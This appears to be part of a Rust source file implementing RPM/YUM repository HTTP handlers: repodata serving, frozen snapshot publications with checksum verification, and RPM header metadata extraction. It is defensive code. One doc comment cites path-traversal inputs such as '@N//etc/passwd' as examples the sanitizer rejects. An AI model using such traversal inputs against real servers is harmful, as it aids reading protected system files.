//! RPM/YUM repository API handlers.
//!
//! Implements the endpoints required for `yum`/`dnf` package management.
//!
//! Routes are mounted at `/rpm/{repo_key}/...`:
//!   GET  /rpm/{repo_key}/repodata/repomd.xml       - Repository metadata index
//!   GET  /rpm/{repo_key}/repodata/primary.xml.gz    - Primary package metadata
//!   GET  /rpm/{repo_key}/repodata/filelists.xml.gz  - File lists (stub)
//!   GET  /rpm/{repo_key}/repodata/other.xml.gz      - Other metadata (stub)
//!   GET  /rpm/{repo_key}/repodata/updateinfo.xml.gz - Update advisories (stub)
//!   GET  /rpm/{repo_key}/repodata/repomd.xml.asc    - Detached OpenPGP signature
//!   GET  /rpm/{repo_key}/repodata/repomd.xml.key    - OpenPGP public key
//!   GET  /rpm/{repo_key}/packages/*path              - Download RPM package
//!   PUT  /rpm/{repo_key}/packages/*path              - Upload RPM package
//!   POST /rpm/{repo_key}/upload                      - Upload RPM (alternative)

use crate::api::handlers::upload_body::UploadBody;
use axum::body::Body;
use axum::extract::{Path, State};
use axum::http::header::{CONTENT_LENGTH, CONTENT_TYPE};
use axum::http::{HeaderMap, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post, put};
use axum::Extension;
use axum::Router;
use bytes::Bytes;
use flate2::write::GzEncoder;
use flate2::Compression;
use sha2::{Digest, Sha256};
use std::io::Write;
use tracing::{error, info, warn};

use crate::api::handlers::error_helpers::{require_openpgp_capable_key, require_signing_key};
use crate::api::handlers::metadata_epoch::metadata_epoch;
use crate::api::handlers::proxy_helpers::{self, RepoInfo};
use crate::api::middleware::auth::{require_auth_basic_scope, AuthExtension};
use crate::api::SharedState;
use crate::formats::rpm::RpmHandler;
use crate::models::repository::{RepositoryFormat, RepositoryType};
use crate::models::signing_key::SigningKey;
use crate::services::cache_classifier;
use crate::services::conda_scripts::{make_inline_script, InstallScript, ScriptKind};
use crate::services::package_analysis_service::{
    record_install_scripts, Completeness, UnanalyzedScript,
};
use crate::services::rpm_layout;
use crate::services::rpm_repodata_builder;
use crate::services::rpm_repodata_cache::{RenderedRepodata, RepodataFingerprint, StoredRepodata};
use crate::services::signing_service::{openpgp_public_keyring, SigningService};

#[cfg(ak_test_shard = "router")]
#[cfg(test)]
mod depth_tests;

#[cfg(ak_test_shard = "router")]
#[cfg(test)]
mod precomputed_tests;

// ---------------------------------------------------------------------------
// Router
// ---------------------------------------------------------------------------

pub fn router() -> Router<SharedState> {
    Router::new()
        .route("/:repo_key/repodata/*path", get(root_repodata))
        // Package download and upload
        .route("/:repo_key/packages/*path", get(download_package))
        .route("/:repo_key/packages/*path", put(upload_package_put))
        // Alternative upload endpoint
        .route("/:repo_key/upload", post(upload_package_post))
        // Proxy fallback for upstream package paths that do not live under
        // /packages/, and full relative paths in depth-enabled hosted repos.
        // Depth-zero hosted repos keep their legacy /packages/ routes.
        .route(
            "/:repo_key/*upstream_path",
            get(upstream_proxy).put(upload_relative),
        )
}

async fn root_repodata(
    State(state): State<SharedState>,
    // Optional so a router mounted without the auth middleware (integration
    // tests, embedded uses) degrades to an anonymous caller instead of a 500.
    // Anonymous is the fail-closed reading: a virtual then lists only its
    // public members (#4346), and hosted repodata does not depend on the
    // caller at all.
    auth: Option<Extension<Option<AuthExtension>>>,
    Path((repo_key, path)): Path<(String, String)>,
) -> Result<Response, Response> {
    let auth = auth.and_then(|Extension(auth)| auth);
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    if rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?
        > 0
    {
        return Err((
            StatusCode::NOT_FOUND,
            "Repodata is served at the configured directory depth",
        )
            .into_response());
    }
    // A virtual's generated repodata depends on the caller (#4346).
    let caller_dependent = repo.repo_type == RepositoryType::Virtual;
    let auth = auth.as_ref();
    let generated = match path.as_str() {
        "repomd.xml" => repomd_xml(State(state), auth, Path(repo_key)).await,
        "primary.xml.gz" => primary_xml_gz(State(state), auth, Path(repo_key)).await,
        "filelists.xml.gz" => filelists_xml_gz(State(state), auth, Path(repo_key)).await,
        "other.xml.gz" => other_xml_gz(State(state), auth, Path(repo_key)).await,
        "repomd.xml.asc" => repomd_xml_asc(State(state), auth, Path(repo_key)).await,
        _ => return root_repodata_static(state, repo_key, path).await,
    };
    generated.map(|resp| {
        if caller_dependent {
            mark_caller_dependent(resp)
        } else {
            resp
        }
    })
}

/// A virtual repository's repodata lists only the members the caller may
/// read (#4346), so one URL serves different bodies to different callers: a
/// shared cache must not store it, and any cache must key it by credential.
/// Hosted repositories are unchanged.
fn mark_caller_dependent(mut resp: Response) -> Response {
    let headers = resp.headers_mut();
    headers.insert(
        axum::http::header::CACHE_CONTROL,
        axum::http::HeaderValue::from_static("private"),
    );
    headers.insert(
        axum::http::header::VARY,
        axum::http::HeaderValue::from_static("Authorization, Cookie"),
    );
    resp
}

/// The caller-independent `/repodata/` entries: update advisories, the public
/// key, and proxied hash-prefixed files.
async fn root_repodata_static(
    state: SharedState,
    repo_key: String,
    path: String,
) -> Result<Response, Response> {
    match path.as_str() {
        "updateinfo.xml.gz" => updateinfo_xml_gz(State(state), Path(repo_key)).await,
        "repomd.xml.key" => repomd_xml_key(State(state), Path(repo_key)).await,
        _ => repodata_proxy(State(state), Path((repo_key, path))).await,
    }
}
async fn depth_response(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    path: &str,
    depth: u32,
    ctx: &crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Response, Response> {
    if let Some((root, file)) = path.split_once("/repodata/") {
        rpm_layout::validate_root(root, depth).map_err(|_| {
            (StatusCode::NOT_FOUND, "No repodata at this directory depth").into_response()
        })?;
        if file == "repomd.xml.key" {
            return public_key(state, repo).await;
        }
        if !matches!(
            file,
            "repomd.xml"
                | "repomd.xml.asc"
                | "primary.xml.gz"
                | "filelists.xml.gz"
                | "other.xml.gz"
                | "updateinfo.xml.gz"
        ) {
            return Err((StatusCode::NOT_FOUND, "Metadata not found").into_response());
        }
        if file == "updateinfo.xml.gz" {
            return Ok(repodata_bytes_response(
                file,
                Bytes::from(gzip_bytes(generate_updateinfo_xml().as_bytes())),
            ));
        }
        return repodata_document(state, auth, repo, root, file).await;
    }
    rpm_layout::validate_path(path, depth)
        .map_err(|_| (StatusCode::NOT_FOUND, "Package not found").into_response())?;
    let artifact: Option<(uuid::Uuid, String, i64, String)> = sqlx::query_as(
        "SELECT id, storage_key, size_bytes, checksum_sha256 FROM artifacts \
             WHERE repository_id = $1 AND path = $2 AND NOT is_deleted",
    )
    .bind(repo.id)
    .bind(path)
    .fetch_optional(&state.db)
    .await
    .map_err(super::db_err)?;
    let (id, storage_key, size_bytes, checksum) =
        artifact.ok_or_else(|| (StatusCode::NOT_FOUND, "Package not found").into_response())?;
    crate::services::quarantine_service::check_artifact_download(&state.db, id)
        .await
        .map_err(IntoResponse::into_response)?;
    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(IntoResponse::into_response)?;
    let stream = storage
        .get_stream(&storage_key)
        .await
        .map_err(IntoResponse::into_response)?;
    crate::services::artifact_service::record_download(&state.db, id, ctx).await;
    let mut response =
        build_rpm_package_response(Body::from_stream(stream), "", size_bytes, &checksum);
    // The stored basename, not its URL form; the shared helper keeps any
    // name a valid header (quoted-string escapes, RFC 5987 for non-ASCII).
    let disposition = crate::api::download_response::content_disposition_attachment(
        path.rsplit('/').next().unwrap_or(path),
    );
    if let Ok(value) = axum::http::HeaderValue::from_str(&disposition) {
        response
            .headers_mut()
            .insert(axum::http::header::CONTENT_DISPOSITION, value);
    }
    Ok(response)
}
// ---------------------------------------------------------------------------
// Repository resolution
// ---------------------------------------------------------------------------

async fn resolve_rpm_repo(db: &sqlx::PgPool, repo_key: &str) -> Result<RepoInfo, Response> {
    proxy_helpers::resolve_repo_by_key(db, repo_key, &["rpm", "yum"], "an RPM").await
}

// ---------------------------------------------------------------------------
// Curated snapshot (`@N`) publication serving (#2358 — RPM Phase-3)
// ---------------------------------------------------------------------------

/// If `path` begins with a `@<digits>` segment, split it into
/// `(version_number, remaining_sub_path)`.
///   `@3/repodata/repomd.xml` -> `Some((3, "repodata/repomd.xml"))`
///   `@3`                     -> `Some((3, ""))`
/// Returns `None` when there is no leading `@N` segment (or the digits do not
/// parse), so the normal proxy path is used.
fn split_publication_prefix(path: &str) -> Option<(i64, String)> {
    let rest = path.strip_prefix('@')?;
    let (num_str, sub) = rest.split_once('/').unwrap_or((rest, ""));
    if num_str.is_empty() || !num_str.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    let version_number: i64 = num_str.parse().ok()?;
    Some((version_number, sub.to_string()))
}

/// Validate a `@N` sub-path before it is joined onto a storage prefix.
///
/// Rejects path traversal (`..`), absolute paths, empty/dot segments, `//` and
/// backslashes so a crafted `@N/../../foo` (or `@N//etc/passwd`) can never
/// escape the per-publication storage prefix. Returns the verified sub-path
/// unchanged, or a `404` response.
#[allow(clippy::result_large_err)]
fn sanitize_publication_subpath(sub: &str) -> Result<String, Response> {
    let rejected = sub.is_empty()
        || sub.starts_with('/')
        || sub.contains('\\')
        || sub.contains("//")
        || sub
            .split('/')
            .any(|seg| seg.is_empty() || seg == "." || seg == "..");
    if rejected {
        return Err((StatusCode::NOT_FOUND, "Not found").into_response());
    }
    Ok(sub.to_string())
}

/// Content type for a stored publication blob, keyed off its extension.
fn publication_content_type(path: &str) -> &'static str {
    if path.ends_with(".gz") {
        "application/gzip"
    } else if path.ends_with(".asc") {
        "application/pgp-signature"
    } else if path.ends_with(".key") {
        "application/pgp-keys"
    } else if path.ends_with(".xml") {
        "application/xml"
    } else {
        "application/octet-stream"
    }
}

/// The `storage_prefix` of a specific PUBLISHED version, or `None` when the
/// version is absent or not yet published (both surface to the client as 404).
async fn fetch_published_version_prefix(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
    version_number: i64,
) -> Result<Option<String>, Response> {
    let row: Option<(Option<String>,)> = sqlx::query_as(
        "SELECT storage_prefix FROM repository_versions \
         WHERE repository_id = $1 AND version_number = $2 AND published_at IS NOT NULL",
    )
    .bind(repo_id)
    .bind(version_number)
    .fetch_optional(db)
    .await
    .map_err(super::db_err)?;
    Ok(row.and_then(|(p,)| p))
}

/// The `storage_prefix` of the repo's ACTIVE publication, or `None` when the
/// repo has no active publication (keeps today's live-generation path).
async fn fetch_active_publication_prefix(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
) -> Result<Option<String>, Response> {
    let row: Option<(Option<String>,)> = sqlx::query_as(
        "SELECT rv.storage_prefix FROM repositories r \
         JOIN repository_versions rv ON rv.id = r.active_publication_id \
         WHERE r.id = $1 AND rv.published_at IS NOT NULL",
    )
    .bind(repo_id)
    .fetch_optional(db)
    .await
    .map_err(super::db_err)?;
    Ok(row.and_then(|(p,)| p))
}

/// Serve `{prefix}/{sub_path}` from the repo's storage. `Ok(Some)` on a hit,
/// `Ok(None)` when the blob is absent (caller falls through / keeps its live
/// path), `Err` on a real storage failure. Metadata blobs are frozen at publish
/// time, so this never proxies upstream.
async fn serve_stored_publication_blob(
    state: &SharedState,
    repo: &RepoInfo,
    prefix: &str,
    sub_path: &str,
) -> Result<Option<Response>, Response> {
    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(|e| e.into_response())?;
    let key = format!("{prefix}/{sub_path}");
    match storage.get(&key).await {
        Ok(bytes) => Ok(Some(
            Response::builder()
                .status(StatusCode::OK)
                .header(CONTENT_TYPE, publication_content_type(sub_path))
                .header(CONTENT_LENGTH, bytes.len().to_string())
                .body(Body::from(bytes))
                .unwrap(),
        )),
        Err(crate::error::AppError::NotFound(_)) => Ok(None),
        Err(e) => Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            crate::api::handlers::storage_err_message(&e),
        )
            .into_response()),
    }
}

/// Active-publication passthrough for the no-`@N` repodata routes: if the repo
/// has an active publication, serve the frozen blob for `sub_path`; otherwise
/// (`Ok(None)`) the caller keeps its unchanged live-generation / proxy path.
async fn try_serve_active_publication(
    state: &SharedState,
    repo: &RepoInfo,
    sub_path: &str,
) -> Result<Option<Response>, Response> {
    let prefix = match fetch_active_publication_prefix(&state.db, repo.id).await? {
        Some(p) => p,
        None => return Ok(None),
    };
    serve_stored_publication_blob(state, repo, &prefix, sub_path).await
}

/// Reject RPM uploads to non-hosted (Remote/Virtual) repositories.
///
/// `dnf`/`yum` only ever PUT/POST RPMs into hosted repos. Both Remote (proxy)
/// and Virtual (aggregate) repos must reject the write verb with
/// `405 Method Not Allowed` so clients receive a consistent, RFC-correct
/// response. The shared `reject_write_if_not_hosted` helper returns `400` for
/// Virtual repos (a contract other subsystems depend on), so RPM intercepts
/// the Virtual case here before delegating the Remote case (#1780).
#[allow(clippy::result_large_err)]
fn reject_rpm_write_if_not_hosted(repo_type: &str) -> Result<(), Response> {
    if repo_type == RepositoryType::Virtual {
        return Err((
            StatusCode::METHOD_NOT_ALLOWED,
            "Cannot publish to a virtual repository",
        )
            .into_response());
    }
    proxy_helpers::reject_write_if_not_hosted(repo_type)
}

/// For Remote RPM repos, proxy `upstream_path` from the configured
/// `upstream_url`. Returns `Ok(Some(response))` on a successful proxy
/// hit, `Ok(None)` when the repository is not a Remote that can serve
/// `upstream_path` (Hosted falls through to the local-generation path,
/// Virtual is currently treated the same as Hosted here pending a
/// follow-up that walks member repos), or `Err(response)` when the
/// upstream fetch itself fails.
///
/// This is the core of the fix for #1447: prior to this helper the
/// repodata handlers always read from the local artifact table even
/// when the repo was a proxy, so dnf saw an empty repository and
/// silently did nothing.
///
/// The document is STREAMED, never buffered (#3486). It is forwarded to the
/// client verbatim — nothing here parses it — so there is no reason to hold it
/// resident, and every buffered-with-a-ceiling variant of this path has
/// eventually met a real repository that outgrew the ceiling: 8 MiB DEFAULT
/// (#2622) -> 128 MiB LARGE (#2623) -> an Oracle Linux 9 `primary` of
/// ~129.5 MiB (#3486), each one a 502 that dnf reports as "all mirrors were
/// already tried". Streaming removes the ceiling instead of raising it, and is
/// the same remedy #2203 applied to the buffered blob fallbacks. It also
/// subsumes the concurrency bound #2665 added here: nothing is resident, so
/// there is no per-request buffer to reserve against the shared byte budget,
/// and a cache hit streams out of storage instead of re-buffering.
///
/// The `expected_checksum` gate keeps the content-addressed integrity check
/// (design S3) the buffered path performed before caching: a createrepo
/// unique-filename (`repodata/<sha256>-primary.xml.gz`) asserts its own body's
/// digest, and such an entry caches as immutable — so a mismatched body is
/// served but never persisted.
///
/// #3556: the real `RepositoryFormat::Rpm` is passed, replacing the `Generic`
/// stand-in the buffered helper used to synthesize. Every caller hands this
/// function a `repodata/…`-rooted path — the exact shape `classify_rpm`'s
/// rules are written against — so `repomd.xml` and `repomd.xml.asc` stay
/// mutable, a non-checksum-prefixed `primary.xml.gz` stays mutable, and only a
/// createrepo unique-filename (`repodata/<hex>-primary.xml.gz`) becomes
/// immutable. That last one is precisely the entry whose body this function
/// already verifies against the digest in its own name before caching it, so
/// the immutable arm and the integrity gate cover the same set.
async fn try_proxy_repodata(
    state: &SharedState,
    repo: &RepoInfo,
    upstream_path: &str,
    default_content_type: &str,
) -> Result<Option<Response>, Response> {
    if repo.repo_type != RepositoryType::Remote {
        return Ok(None);
    }
    let (upstream_url, proxy) = match (&repo.upstream_url, &state.proxy_service) {
        (Some(u), Some(p)) => (u, p),
        _ => return Ok(None),
    };

    let expected_checksum = cache_classifier::expected_sha256_from_path(upstream_path)
        .map(|hex| hex.to_ascii_lowercase());

    // UNRECORDED-PROXY-SERVE: repodata is repository metadata, not an artifact,
    // and is deliberately never counted — `dnf` refetches repomd/primary/
    // filelists on every `makecache`, so counting them would report metadata
    // refreshes as package downloads. An RPM pull is counted on the package
    // serve arms. This arm only became visible to the class guard when #3486
    // moved it off the buffered `proxy_fetch_capped` (which the guard does not
    // scan) onto the streaming helper; what it serves is unchanged.
    let result = proxy_helpers::proxy_fetch_streaming_with_cache_key_verified(
        proxy,
        repo.id,
        &repo.key,
        upstream_url,
        upstream_path,
        upstream_path,
        expected_checksum,
        RepositoryFormat::Rpm,
    )
    .await?;

    proxy_helpers::stream_fetch_result(result, default_content_type, None).map(Some)
}

/// Build the HTTP 200 response for serving an RPM package body.
///
/// Shared by the `/packages/*` download path and the upstream-proxy local
/// cache-hit path so both emit identical headers. The `body` is supplied by the
/// caller — always a streaming [`Body::from_stream`] over `get_stream` so the
/// whole `.rpm` is never buffered in memory (#1608, Core Invariant ①) — and
/// `size_bytes` is the stored artifact size used for the `Content-Length`
/// header (we must not read the object to learn its length).
fn build_rpm_package_response(
    body: Body,
    filename: &str,
    size_bytes: i64,
    checksum_sha256: &str,
) -> Response {
    Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/x-rpm")
        .header(
            "Content-Disposition",
            format!("attachment; filename=\"{}\"", filename),
        )
        .header(CONTENT_LENGTH, size_bytes.to_string())
        // `artifacts.checksum_sha256` is a fixed-width `CHAR(64)` column, so a
        // value shorter than 64 chars (e.g. test seeds) comes back space-padded.
        // Trim it so the header never carries trailing whitespace.
        .header("X-Checksum-SHA256", checksum_sha256.trim())
        .body(body)
        .unwrap()
}

/// Is `p` a safe RELATIVE upstream path to append to a curation-config
/// upstream base?
///
/// The stored `upstream_path` comes from the upstream `<location href>`, which
/// is attacker-influenced. `ProxyService::build_upstream_url` concatenates
/// (`{base}/{path}`), so an absolute href cannot currently override the host —
/// but this guard makes that safety explicit and local rather than an implicit
/// dependency on a helper elsewhere: an absolute URL, an absolute path, a
/// traversal, or a backslash is rejected so the `@N` fetch can only ever target
/// a path UNDER the configured curation upstream (defense in depth, #2358).
fn is_safe_upstream_rel_path(p: &str) -> bool {
    !p.is_empty()
        && !p.contains("://")
        && !p.starts_with('/')
        && !p.contains('\\')
        && !p.split('/').any(|seg| seg == "..")
}

/// Stream an already-verified, frozen `@N` package from the immutable store
/// (cache hit). Chunked (no `Content-Length`) so the whole `.rpm` is never
/// buffered in memory when re-serving. Advertises the FROZEN checksum, so what a
/// client validates against is what `@N`'s signed metadata attests.
fn stream_rpm_response(body: Body, filename: &str, checksum_sha256: &str) -> Response {
    Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/x-rpm")
        .header(
            "Content-Disposition",
            format!("attachment; filename=\"{}\"", filename),
        )
        .header("X-Checksum-SHA256", checksum_sha256.trim())
        .body(body)
        .unwrap()
}

/// Checksum-verified serving of a package under a published, immutable `@N`
/// (#2358 A-hardened).
///
/// Everything this path trusts comes from the **frozen** snapshot membership
/// (`repository_version_packages.frozen_*`), never from the live
/// `curation_packages` row. That distinction is the whole security property:
/// `curation_packages` is mutable (a routine re-sync upserts the same row), so
/// resolving the checksum/location live would let a post-publish sync — or a
/// compromised upstream — change what an already-published, SIGNED `@N` serves,
/// handing out bytes that contradict `@N`'s own signed `primary.xml`. The frozen
/// checksum is snapshotted from the same state the signed metadata is generated
/// from, so verified bytes always match what `@N` attests.
///
/// The package BYTES are resolved and served fail-closed:
///   1. Cache hit — a previously verified+stored copy in the version's immutable
///      per-version store streams straight back (never re-fetched), advertising
///      the FROZEN checksum.
///   2. Otherwise fetch from the CURATION-CONFIG upstream (the curation source
///      repo's `upstream_url` plus the FROZEN `upstream_path`) — NEVER from
///      `repo.upstream_url` and NEVER from any metadata blob — VERIFY
///      `sha256 == frozen_checksum_sha256`, and only on a match cache the bytes
///      into the frozen store and stream them. A missing member, missing
///      upstream, or a checksum MISMATCH fails closed (404 / 502): neither a
///      tampered upstream body nor a post-publish live mutation is ever served.
async fn serve_version_package(
    state: &SharedState,
    repo: &RepoInfo,
    version_prefix: &str,
    version_number: i64,
    filename: &str,
) -> Result<Response, Response> {
    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(|e| e.into_response())?;
    let cache_key = format!("{version_prefix}/packages/{filename}");

    // 1. Resolve the member from the FROZEN snapshot membership. The upstream
    //    URL still comes from the curation source repo (that is config, not
    //    package identity); the checksum and the relative path are frozen.
    let member = sqlx::query_as::<_, (String, String, Option<String>, uuid::Uuid, String)>(
        "SELECT rvp.frozen_checksum_sha256, rvp.frozen_upstream_path, \
                r.upstream_url, r.id, r.key \
         FROM repository_version_packages rvp \
         JOIN repository_versions rv ON rv.id = rvp.version_id \
         JOIN curation_packages cp ON cp.id = rvp.curation_package_id \
         JOIN repositories r ON r.id = cp.remote_repo_id \
         WHERE rv.repository_id = $1 AND rv.version_number = $2 \
           AND rv.published_at IS NOT NULL \
           AND rvp.frozen_filename = $3",
    )
    .bind(repo.id)
    .bind(version_number)
    .bind(filename)
    .fetch_optional(&state.db)
    .await
    .map_err(super::db_err)?;

    let (expected, upstream_path, upstream_url, remote_id, remote_key) = match member {
        Some((ck, up, Some(url), rid, rkey)) if !ck.trim().is_empty() => (ck, up, url, rid, rkey),
        // No such member, or nothing to fetch against -> fail closed.
        _ => return Err((StatusCode::NOT_FOUND, "Not found").into_response()),
    };

    // 2. Cache-first: stream the already-verified copy from the immutable
    //    per-version store, advertising the FROZEN checksum.
    if let Ok(stream) = storage.get_stream(&cache_key).await {
        return Ok(stream_rpm_response(
            Body::from_stream(stream),
            filename,
            expected.trim(),
        ));
    }

    // The stored href is attacker-influenced: refuse to fetch anything that is
    // not a plain relative path under the curation upstream.
    if !is_safe_upstream_rel_path(&upstream_path) {
        tracing::warn!(
            "@{} package {} has an unsafe upstream path {:?}; refusing to fetch",
            version_number,
            filename,
            upstream_path
        );
        return Err((StatusCode::NOT_FOUND, "Not found").into_response());
    }

    let proxy = state
        .proxy_service
        .as_ref()
        .ok_or_else(|| (StatusCode::BAD_GATEWAY, "Upstream proxy unavailable").into_response())?;

    // Fetch UNCACHED from the curation-config upstream so an unverified body is
    // never persisted to the shared proxy cache.
    let (bytes, _ct, _url) = proxy_helpers::proxy_fetch_uncached(
        proxy,
        remote_id,
        &remote_key,
        &upstream_url,
        &upstream_path,
    )
    .await?;

    // VERIFY sha256 == the FROZEN checksum. FAIL CLOSED on mismatch. This is what
    // catches an upstream mirror that changed the bytes behind an already-
    // published NEVRA, and a post-publish re-sync that rewrote the live curation
    // row: neither can make `@N` serve bytes its signed metadata does not attest.
    if !sha256_hex(&bytes).eq_ignore_ascii_case(expected.trim()) {
        tracing::warn!(
            "@{} package {} failed verification against the FROZEN snapshot checksum; \
             refusing to serve",
            version_number,
            filename
        );
        return Err((
            StatusCode::BAD_GATEWAY,
            "Upstream package failed checksum verification",
        )
            .into_response());
    }

    // Cache into the immutable frozen store, then stream the verified bytes.
    let size = bytes.len() as i64;
    storage.put(&cache_key, bytes.clone()).await.map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            crate::api::handlers::storage_err_message(&e),
        )
            .into_response()
    })?;

    Ok(build_rpm_package_response(
        Body::from(bytes),
        filename,
        size,
        expected.trim(),
    ))
}

// ---------------------------------------------------------------------------
// RPM filename parsing
// ---------------------------------------------------------------------------

/// Parse an RPM filename into (name, version, release, arch).
/// Expected format: `{name}-{version}-{release}.{arch}.rpm`
///
/// Examples:
///   my-package-1.0.0-1.x86_64.rpm -> ("my-package", "1.0.0", "1", "x86_64")
///   hello-2.10-1.el8.noarch.rpm   -> ("hello", "2.10", "1.el8", "noarch")
pub(crate) fn parse_rpm_filename(filename: &str) -> Option<(String, String, String, String)> {
    let stem = filename.strip_suffix(".rpm")?;

    // Find arch: last dot-separated segment
    let (before_arch, arch) = stem.rsplit_once('.')?;

    // Find release: last hyphen-separated segment
    let (before_release, release) = before_arch.rsplit_once('-')?;

    // Find version: last hyphen-separated segment of what remains
    let (name, version) = before_release.rsplit_once('-')?;

    if name.is_empty() || version.is_empty() || release.is_empty() || arch.is_empty() {
        return None;
    }

    Some((
        name.to_string(),
        version.to_string(),
        release.to_string(),
        arch.to_string(),
    ))
}

/// Build the `artifact_metadata` JSON for a stored `.rpm` package.
///
/// Combines the filename-derived NEVRA with whatever the RPM header yields
/// (summary, description, license, sourcerpm, ...), preferring header fields —
/// the header is authoritative, the filename is only a convention. Used by
/// both the native RPM upload path and the generic chunked-upload completion
/// so packages surface identical format metadata regardless of how they were
/// pushed (#2588).
///
/// Header-parse failures are non-fatal: the filename-derived fields are kept
/// and the header-only fields stay absent. Returns `None` only when *neither*
/// source yields anything (non-NEVRA filename and unparseable content), in
/// which case the caller should record no metadata at all.
pub(crate) fn build_rpm_artifact_metadata(
    filename: &str,
    content: &[u8],
) -> Result<Option<serde_json::Value>, RpmUploadRejected> {
    // The repodata block first: a header over the indexing limits refuses
    // the upload whatever else parses (#3801).
    let block = match rpm_repodata_block(content, true) {
        RepodataBlock::OverLimit(reason) => return Err(RpmUploadRejected(reason)),
        RepodataBlock::Info(b) | RepodataBlock::Unparseable(b) => Some(b),
        RepodataBlock::Pending => None,
    };

    let parsed = parse_rpm_filename(filename);
    let header = crate::formats::rpm::RpmHandler::parse_rpm_header(content).ok();
    if parsed.is_none() && header.is_none() {
        return Ok(None);
    }

    let (file_name, file_version, file_release, file_arch) = parsed.unwrap_or_default();
    let prefer = |from_header: Option<&String>, from_filename: String| -> String {
        match from_header {
            Some(s) if !s.is_empty() => s.clone(),
            _ => from_filename,
        }
    };

    let h = header.as_ref();
    let mut metadata = serde_json::json!({
        "name": prefer(h.map(|m| &m.name), file_name),
        "version": prefer(h.map(|m| &m.version), file_version),
        "release": prefer(h.map(|m| &m.release), file_release),
        "arch": prefer(h.map(|m| &m.arch), file_arch),
        "filename": filename,
    });

    if let Some(h) = header {
        for (key, value) in [
            ("summary", h.summary),
            ("description", h.description),
            ("license", h.license),
            ("group", h.group),
            ("url", h.url),
            ("source_rpm", h.source_rpm),
        ] {
            if let Some(v) = value {
                metadata[key] = serde_json::Value::String(v);
            }
        }
    }
    if let Some(block) = block {
        metadata[RPM_REPODATA_KEY] = block;
    }
    // createrepo_c refuses a package with C0 control characters (other than
    // tab/LF/CR) in any field it writes (`cr_Package_contains_forbidden_
    // control_chars`): XML 1.0 cannot carry them, so one such package would
    // make the whole repository's metadata ill-formed for dnf.
    if let Some(field) = forbidden_control_char_field(&metadata) {
        return Err(RpmUploadRejected(format!(
            "RPM header field {field} contains control characters that repository \
             metadata cannot carry"
        )));
    }

    Ok(Some(metadata))
}

/// An RPM upload refused at upload time (answered with 400) because its
/// header cannot be indexed safely (#3801).
#[derive(Debug)]
pub(crate) struct RpmUploadRejected(pub(crate) String);

/// Key of the header-derived repodata block inside an RPM artifact's
/// `artifact_metadata` (#3801).
pub(crate) const RPM_REPODATA_KEY: &str = "repodata";
/// Shape version of that block. Bump it when the extraction changes in a way
/// already-stored packages must pick up: blocks with any other version are
/// ignored by the renderer and re-derived by [`heal_rpm_repodata_info`].
const RPM_REPODATA_INFO_VERSION: u64 = 1;

/// Outcome of deriving the repodata block from a package's leading bytes.
enum RepodataBlock {
    /// The header's repodata fields, as the stored JSON block.
    Info(serde_json::Value),
    /// A deterministic "no repodata for this package" marker
    /// (`{"v":1,"unparseable":true,"reason":..}`), stored so the heal never
    /// re-reads the package; it renders with NEVRA and text fields only.
    Unparseable(serde_json::Value),
    /// Over the indexing limits: an upload is refused; a stored package gets
    /// an [`RepodataBlock::Unparseable`] marker instead.
    OverLimit(String),
    /// The bytes end before the header does (a bounded upload prefix); leave
    /// the block for the heal, which reads the stored package.
    Pending,
}

fn unparseable_block(reason: &str) -> serde_json::Value {
    serde_json::json!({
        "v": RPM_REPODATA_INFO_VERSION,
        "unparseable": true,
        "reason": reason,
    })
}

/// Derive the dependency lists, file list, sizes and header range that
/// `primary.xml`/`filelists.xml` need (#3801). `may_be_prefix` is true when
/// `content` is a bounded prefix that may end inside the header.
fn rpm_repodata_block(content: &[u8], may_be_prefix: bool) -> RepodataBlock {
    use crate::formats::rpm::RpmHeaderError;
    match RpmHandler::parse_rpm_repodata_info(content) {
        Ok(info) => match serde_json::to_value(info) {
            Ok(mut block) => {
                block["v"] = serde_json::Value::from(RPM_REPODATA_INFO_VERSION);
                if let Some(field) = forbidden_control_char_field(&block) {
                    return RepodataBlock::OverLimit(format!(
                        "RPM header field {field} contains control characters that \
                         repository metadata cannot carry"
                    ));
                }
                RepodataBlock::Info(block)
            }
            Err(e) => RepodataBlock::Unparseable(unparseable_block(&e.to_string())),
        },
        Err(RpmHeaderError::OverLimit(reason)) => RepodataBlock::OverLimit(reason),
        Err(RpmHeaderError::Malformed(reason)) => {
            if may_be_prefix
                && RpmHandler::header_bytes_needed(content).is_some_and(|n| n > content.len())
            {
                RepodataBlock::Pending
            } else {
                RepodataBlock::Unparseable(unparseable_block(&reason))
            }
        }
    }
}

/// XML 1.0 cannot represent C0 controls other than tab, LF and CR.
fn is_forbidden_xml_control(c: char) -> bool {
    (c < '\u{20}' && !matches!(c, '\t' | '\n' | '\r')) || matches!(c, '\u{fffe}' | '\u{ffff}')
}

/// The JSON path of the first string (value or key) in `value` carrying a
/// character XML 1.0 cannot represent, if any.
fn forbidden_control_char_field(value: &serde_json::Value) -> Option<String> {
    fn walk(v: &serde_json::Value, path: &mut String) -> bool {
        match v {
            serde_json::Value::String(s) => s.chars().any(is_forbidden_xml_control),
            serde_json::Value::Array(items) => items.iter().enumerate().any(|(i, item)| {
                let len = path.len();
                path.push_str(&format!("[{i}]"));
                let hit = walk(item, path);
                if !hit {
                    path.truncate(len);
                }
                hit
            }),
            serde_json::Value::Object(map) => map.iter().any(|(k, item)| {
                let len = path.len();
                path.push('.');
                path.push_str(
                    &k.chars()
                        .filter(|c| !is_forbidden_xml_control(*c))
                        .collect::<String>(),
                );
                let hit = k.chars().any(is_forbidden_xml_control) || walk(item, path);
                if !hit {
                    path.truncate(len);
                }
                hit
            }),
            _ => false,
        }
    }
    let mut path = String::new();
    walk(value, &mut path).then(|| path.trim_start_matches('.').to_string())
}

